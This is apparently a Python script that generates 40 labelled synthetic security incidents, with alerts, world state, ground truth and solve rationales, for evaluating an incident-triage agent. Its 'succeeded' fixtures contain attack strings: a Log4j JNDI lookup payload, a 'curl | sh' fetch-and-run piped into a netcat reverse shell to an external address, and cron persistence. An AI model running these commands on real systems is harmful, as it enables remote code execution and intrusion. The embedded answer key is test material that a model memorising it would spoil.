"""Generate the 40 labelled synthetic incidents.

Deterministic (fixed seed) so the eval scoreboard is reproducible and nobody
can accuse us of cherry-picking a lucky run. Distribution:

    14 succeeded   attack landed on an exploitable target, persistence/beacon
    16 failed      attempted but target not exploitable (patched / wrong svc)
     6 scanner      opportunistic spray, no real service on the port
     4 benign       legitimate admin/automation misread as an attack
    ----
    40 total,  >=6 of them ADVERSARIAL (label contradicts the naive read):
       critical-severity alerts that actually failed, and
       low-severity alerts that actually succeeded.

Ground truth is never stored where a tool can read it directly — it is
*implied* by the world (versions, process trees, flows), so the agent must
investigate to recover it. That is the point.

Run:  python -m verdict.env.generate      # writes verdict/env/incidents/*.json
"""
from __future__ import annotations

import json
import random
from pathlib import Path

from .world import vtuple

INCIDENTS_DIR = Path(__file__).parent / "incidents"

# product -> (cve_id, patched_in, exploit_maturity, alert_signature, port)
VULN_CATALOG = {
    "apache-log4j": ("CVE-2021-44228", "2.17.0", "weaponized", "ET EXPLOIT Apache Log4j RCE Attempt", 8080),
    "apache-struts": ("CVE-2017-5638", "2.5.13", "weaponized", "ET EXPLOIT Apache Struts OGNL Injection", 443),
    "spring-framework": ("CVE-2022-22965", "5.3.18", "weaponized", "ET EXPLOIT Spring4Shell RCE Attempt", 8443),
    "openssl": ("CVE-2014-0160", "1.0.1g", "poc", "ET EXPLOIT Heartbleed Data Leak", 443),
    "atlassian-confluence": ("CVE-2022-26134", "7.18.1", "weaponized", "ET EXPLOIT Confluence OGNL RCE", 8090),
    "microsoft-exchange": ("CVE-2021-26855", "15.2.792", "weaponized", "ET EXPLOIT ProxyLogon SSRF", 443),
}
PRODUCTS = list(VULN_CATALOG)

ADMIN_HOSTS = ["10.0.0.5", "10.0.0.6"]        # jump boxes; benign sources
SHARED_NAT = "10.9.9.1"                        # office egress; 340 users behind


def _dst_ip(rng: random.Random) -> str:
    return f"10.2.{rng.randint(1, 8)}.{rng.randint(10, 250)}"


def _ext_ip(rng: random.Random) -> str:
    return f"203.0.113.{rng.randint(2, 254)}"   # TEST-NET-3, safe/synthetic


def _make_asset(ip, product, version, port, criticality, peers, nat=False):
    asset = {
        "host": f"host-{ip.replace('.', '-')}",
        "os": "linux",
        "criticality": criticality,
        "owner": "platform-team",
        "services": {str(port): {"product": product, "version": version}},
        "peers": peers,
    }
    if nat:
        asset["is_shared_nat"] = True
        asset["users_behind"] = 340
    return asset


def _cve_record(product):
    cid, patched_in, maturity, _sig, _port = VULN_CATALOG[product]
    return cid, {"product": product, "patched_in": patched_in, "exploit_maturity": maturity}


def _below(patched_in: str) -> str:
    """A numeric version whose vtuple is strictly below patched_in (vulnerable).

    Works off vtuple() so it stays consistent with cve_match and tolerates
    non-numeric patch strings like Heartbleed's '1.0.1g'.
    """
    parts = list(vtuple(patched_in))
    parts[-1] -= 1
    if parts[-1] < 0:
        parts[-1] = 0
        if len(parts) > 1:
            parts[-2] = max(parts[-2] - 1, 0)
    return ".".join(str(p) for p in parts)


def _atleast(patched_in: str) -> str:
    """A numeric version whose vtuple is >= patched_in (patched, not vulnerable)."""
    parts = list(vtuple(patched_in))
    parts[-1] += 1
    return ".".join(str(p) for p in parts)


def _base(rng, iid, product, dst, version, severity):
    cid, patched_in, maturity, sig, port = VULN_CATALOG[product]
    cve_id, cve_rec = _cve_record(product)
    src = _ext_ip(rng)
    flow_id = f"f{rng.randint(1000, 9999)}"
    alert = {
        "src": src,
        "dst": dst,
        "dst_port": port,
        "proto": "tcp",
        "signature": sig,
        "claimed_cve": cid,
        "severity": severity,
        "ts": f"2026-09-1{rng.randint(0,9)}T0{rng.randint(0,9)}:{rng.randint(10,59)}:00Z",
    }
    return src, port, flow_id, alert, cve_id, cve_rec, patched_in


def make_succeeded(rng, n, adversarial=False):
    iid = f"A-{n:04d}"
    product = rng.choice(PRODUCTS)
    dst = _dst_ip(rng)
    src, port, flow_id, alert, cve_id, cve_rec, patched_in = _base(
        rng, iid, product, dst, _below(VULN_CATALOG[product][1]),
        "low" if adversarial else "high",
    )
    version = _below(patched_in)
    host = f"host-{dst.replace('.', '-')}"
    world = {
        "assets": {dst: _make_asset(dst, product, version, port, "high", [_dst_ip(rng)])},
        "cves": {cve_id: cve_rec},
        "flows": {flow_id: {"direction": "outbound", "bytes_out": 84213,
                            "bytes_in": 512, "duration_s": 604, "state": "ESTABLISHED",
                            "note": "periodic 60s beacon to external host"}},
        "logs": {host: [
            f"[{host}] {port} POST /api/x 200 jndi:ldap://{src}/a  <- payload accepted",
            f"[{host}] spawned /bin/sh from service process",
        ]},
        "proc_trees": {host: {"suspicious": True,
                              "tree": "java -> sh -c 'curl {}|sh' -> nc {} 4444".format(src, src),
                              "persistence": "cron @reboot /tmp/.beacon"}},
        "sessions": [{"src": src, "dst": dst, "port": port, "legit": False}],
        "firewall": [],
    }
    gt = {"verdict": "SUCCEEDED", "action": "contain"}
    return _wrap(iid, alert, world, gt, flow_id, adversarial,
                 "vulnerable version + shell spawned + outbound beacon")


def make_failed(rng, n, adversarial=False):
    iid = f"A-{n:04d}"
    product = rng.choice(PRODUCTS)
    dst = _dst_ip(rng)
    src, port, flow_id, alert, cve_id, cve_rec, patched_in = _base(
        rng, iid, product, dst, _atleast(VULN_CATALOG[product][1]),
        "critical" if adversarial else "medium",
    )
    version = _atleast(patched_in)      # PATCHED -> not exploitable
    host = f"host-{dst.replace('.', '-')}"
    world = {
        "assets": {dst: _make_asset(dst, product, version, port, "high", [_dst_ip(rng)])},
        "cves": {cve_id: cve_rec},
        "flows": {flow_id: {"direction": "inbound", "bytes_out": 128,
                            "bytes_in": 340, "duration_s": 1, "state": "RST",
                            "note": "connection reset, no data exfil"}},
        "logs": {host: [
            f"[{host}] {port} POST /api/x 403 jndi:ldap://{src}/a  <- payload rejected",
            f"[{host}] no new child processes",
        ]},
        "proc_trees": {host: {"suspicious": False,
                              "tree": "java (steady state, no children)",
                              "persistence": None}},
        "sessions": [{"src": src, "dst": dst, "port": port, "legit": False}],
        "firewall": [],
    }
    gt = {"verdict": "FAILED", "action": "monitor"}
    return _wrap(iid, alert, world, gt, flow_id, adversarial,
                 "target patched above patched_in; payload rejected; RST, no exfil")


def make_scanner(rng, n):
    iid = f"A-{n:04d}"
    product = rng.choice(PRODUCTS)
    dst = _dst_ip(rng)
    # service is NOT on the alerted port -> nothing to exploit
    src, port, flow_id, alert, cve_id, cve_rec, patched_in = _base(
        rng, iid, product, dst, _below(VULN_CATALOG[product][1]), "medium",
    )
    host = f"host-{dst.replace('.', '-')}"
    asset = _make_asset(dst, "nginx", "1.24.0", 80, "low", [])  # only :80 open
    world = {
        "assets": {dst: asset},
        "cves": {cve_id: cve_rec},
        "flows": {flow_id: {"direction": "inbound", "bytes_out": 0, "bytes_in": 64,
                            "duration_s": 0, "state": "REFUSED",
                            "note": "SYN to closed port, part of /24 sweep"}},
        "logs": {host: [f"[{host}] connection refused on {port} (service not listening)"]},
        "proc_trees": {host: {"suspicious": False, "tree": "nginx", "persistence": None}},
        "sessions": [{"src": src, "dst": dst, "port": port, "legit": False}],
        "firewall": [],
    }
    gt = {"verdict": "FALSE_POSITIVE", "action": "monitor"}
    return _wrap(iid, alert, world, gt, flow_id, False,
                 "alerted service not running on that port; port-sweep noise")


def make_benign(rng, n):
    iid = f"A-{n:04d}"
    product = "openssh"
    dst = _dst_ip(rng)
    src = rng.choice(ADMIN_HOSTS)          # internal jump box
    port = 22
    flow_id = f"f{rng.randint(1000, 9999)}"
    host = f"host-{dst.replace('.', '-')}"
    alert = {
        "src": src, "dst": dst, "dst_port": port, "proto": "tcp",
        "signature": "ET SCAN Potential SSH Brute Force",
        "claimed_cve": None, "severity": "medium",
        "ts": f"2026-09-11T0{rng.randint(1,9)}:15:00Z",
    }
    world = {
        "assets": {dst: _make_asset(dst, "openssh", "9.6", 22, "medium", [])},
        "cves": {},
        "flows": {flow_id: {"direction": "inbound", "bytes_out": 4096, "bytes_in": 8192,
                            "duration_s": 320, "state": "ESTABLISHED",
                            "note": "interactive session from internal jump host"}},
        "logs": {host: [
            f"[{host}] sshd: Accepted publickey for deploy from {src}",
            f"[{host}] sudo: deploy : COMMAND=/usr/bin/systemctl restart api",
        ]},
        "proc_trees": {host: {"suspicious": False,
                              "tree": "sshd -> bash -> systemctl (known deploy)",
                              "persistence": None}},
        "sessions": [{"src": src, "dst": dst, "port": port, "legit": True}],
        "firewall": [],
    }
    gt = {"verdict": "FALSE_POSITIVE", "action": "close"}
    return _wrap(iid, alert, world, gt, flow_id, False,
                 "source is an internal admin jump box; publickey auth + known deploy")


def _wrap(iid, alert, world, gt, flow_id, adversarial, rationale):
    alert["flow_id"] = flow_id
    return {
        "id": iid,
        "alert": alert,
        "world": world,
        "ground_truth": gt,
        "adversarial": adversarial,
        "solve_rationale": rationale,   # for human review / test oracle, not a tool
    }


def build_all() -> list[dict]:
    rng = random.Random(42)
    incidents = []
    n = 1000
    # 14 succeeded (4 adversarial: low-sev but real)
    for i in range(14):
        incidents.append(make_succeeded(rng, n, adversarial=(i < 4))); n += 1
    # 16 failed (2 adversarial: critical-sev but harmless)
    for i in range(16):
        incidents.append(make_failed(rng, n, adversarial=(i < 2))); n += 1
    # 6 scanner noise
    for _ in range(6):
        incidents.append(make_scanner(rng, n)); n += 1
    # 4 benign
    for _ in range(4):
        incidents.append(make_benign(rng, n)); n += 1
    return incidents


def main() -> None:
    INCIDENTS_DIR.mkdir(parents=True, exist_ok=True)
    incidents = build_all()
    for inc in incidents:
        (INCIDENTS_DIR / f"{inc['id']}.json").write_text(
            json.dumps(inc, indent=2), encoding="utf-8"
        )
    adv = sum(1 for i in incidents if i["adversarial"])
    dist: dict[str, int] = {}
    for i in incidents:
        dist[i["ground_truth"]["verdict"]] = dist.get(i["ground_truth"]["verdict"], 0) + 1
    print(f"wrote {len(incidents)} incidents to {INCIDENTS_DIR}")
    print(f"distribution: {dist}")
    print(f"adversarial: {adv}")


if __name__ == "__main__":
    main()
